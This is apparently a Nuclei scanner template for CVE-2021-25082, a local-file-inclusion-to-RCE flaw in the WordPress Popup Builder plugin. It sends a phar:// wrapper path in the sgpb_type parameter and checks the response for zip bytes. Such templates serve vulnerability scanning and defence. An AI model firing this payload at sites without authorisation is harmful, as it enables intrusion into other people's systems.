id: CVE-2021-25082

info:
  name: Popup Builder < 4.0.7 - LFI to RCE
  author: rix4uni
  severity: high
  description: The plugin does not validate and sanitise the sgpb_type parameter before using it in a require statement, leading to a Local File Inclusion issue. Furthermore, since the beginning of the string can be controlled, the issue can lead to RCE vulnerability via wrappers such as PHAR
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-25082
    - https://wpscan.com/vulnerability/0f90f10c-4b0a-46da-ac1f-aa6a03312132
  tags: lfi,rce

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?sgpb_type=phar://wp-content/uploads/2021/12/1.zip/'

    matchers-condition: and
    matchers:
      - type: binary
        binary:
          - "504B0304"  # zip

      - type: status
        status:
          - 200